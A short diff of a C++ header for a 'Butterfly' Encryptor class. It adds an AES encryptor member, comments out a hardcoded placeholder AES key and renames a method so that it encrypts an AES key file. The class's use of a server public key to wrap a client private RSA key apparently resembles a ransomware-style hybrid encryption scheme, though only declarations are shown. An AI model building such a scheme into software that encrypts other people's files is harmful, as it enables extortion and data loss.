@@ -3,6 +3,7 @@
 #define BUTTERFLY_ENCRYPTOR_H
 
 #include "crypto/rsaEncryptor.h"
+#include "crypto/aesEncryptor.h"
 #include "crypto/serverPublicKey.h"
 #include "params.h"
 
@@ -20,8 +21,9 @@ class Encryptor
 
 private:
     int _keySize;
-    std::string _aesKey = "0123456789abcdefghijklabcdefg"; // TODO: get the string from the aes encryption class
+    //std::string _aesKey = "0123456789abcdefghijklabcdefg"; // TODO: get the string from the aes encryption class
     std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
+    std::unique_ptr<aes::AESEncryptor> _aesEncryptor;
 
 public:
     /**
@@ -40,9 +42,9 @@ public:
     void encryptCPrivateRSA();
 
     /**
-     * Encrypts the AESKey and saves the bin file
+     * Encrypts the AES Key sql file to a binary file
      */
-    void encryptAESKey();
+    void encryptAESKeyFile(const std::string &filepath);
 
 };
 
